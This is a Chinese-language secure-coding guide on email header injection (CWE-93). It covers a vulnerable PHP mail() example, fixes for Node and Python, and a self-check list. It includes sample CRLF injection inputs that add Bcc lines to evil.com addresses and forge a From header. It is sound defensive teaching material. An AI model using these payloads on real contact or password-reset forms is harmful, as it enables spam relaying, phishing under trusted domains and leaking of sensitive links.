# 邮件头注入 (Email Header Injection)

> 分类：注入类 | 风险：中 | CWE-93

## 1. 攻击原理

邮件头同样以 CRLF 分隔。当应用把用户输入（收件人、主题、回复地址、显示名）拼进 SMTP 头时，攻击者可注入额外头字段，实现**垃圾邮件中继、密送窃取、伪造发件人、钓鱼**。

常见入口：联系表单、邀请邮件、找回密码、通知模板中的「收件人姓名」。

## 2. 攻击示例

```php
// ❌ 原始实现
$to = $_POST['email'];
mail($to, "Welcome", $body, "From: noreply@site.com");
```

输入：

```text
victim@x.com
Bcc: a@evil.com,b@evil.com
```

生成的邮件同时密送大量地址 → 应用沦为垃圾邮件中继，域名信誉受损。

主题注入：

```text
Hello%0d%0aBcc:attacker@evil.com
```

伪造发件人：

```text
attacker@evil.com%0d%0aFrom:ceo@bank.com
```

## 3. 影响

- 邮件中继滥用，IP/域名被列入黑名单
- 敏感信息（验证码、重置链接）被密送泄露
- 钓鱼邮件借可信域名发出
- 绕过 SPF/DKIM 的社工攻击

## 4. 防御措施

1. **使用成熟邮件 SDK 的对象 API**：`to`、`subject`、`from` 分开传参，SDK 负责编码，禁止手工拼接头部。
2. **严格校验邮箱**：`^[^@\s\r\n]+@[^@\s\r\n]+\.[A-Za-z]{2,}$`，并额外拒绝 `\r`、`\n`、`,`、`;`、`:`。
3. **主题与显示名编码**：使用 RFC 2047 编码（多数 SDK 自动处理），限制长度。
4. **收件人白名单/去重**：批量发送时逐条发送，不用逗号拼接收件人列表。
5. **限制发送频率与配额**：按用户/IP 限流，异常突增告警。
6. **SPF / DKIM / DMARC**：发信域名配置三者，降低被冒用风险。
7. **验证码 / 重置链接绑定用户**，不在邮件正文中回显其他用户信息。

## 5. 代码对比

```js
// ❌ 手工拼头
sendRaw(`To: ${email}\r\nSubject: ${subject}\r\n\r\n${body}`);

// ✅ SDK 对象 API + 校验
import nodemailer from 'nodemailer';
const EMAIL_RE = /^[^@\s\r\n,;:]+@[^@\s\r\n,;:]+\.[A-Za-z]{2,}$/;
if (!EMAIL_RE.test(email) || email.length > 254) throw new Error('invalid email');

await transporter.sendMail({
  from: { name: 'Site', address: 'noreply@site.com' },
  to: email,
  subject: subject.replace(/[\r\n]/g, ' ').slice(0, 200),
  text: body,
});
```

```python
# ✅ Python
from email.message import EmailMessage
msg = EmailMessage()
msg['To'] = validated_email
msg['Subject'] = subject.replace('\r', '').replace('\n', '')
```

## 6. 自查清单

- [ ] 无手工拼接 SMTP 头
- [ ] 邮箱输入通过严格正则并拒绝换行与分隔符
- [ ] 主题/显示名去除 CRLF 并限长
- [ ] 批量收件人逐条发送，不拼接列表
- [ ] 发信频率受限，有异常告警
- [ ] 域名已配置 SPF / DKIM / DMARC

## 7. 参考资料

- OWASP: Email Injection
- CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')
- RFC 5322 / RFC 2047
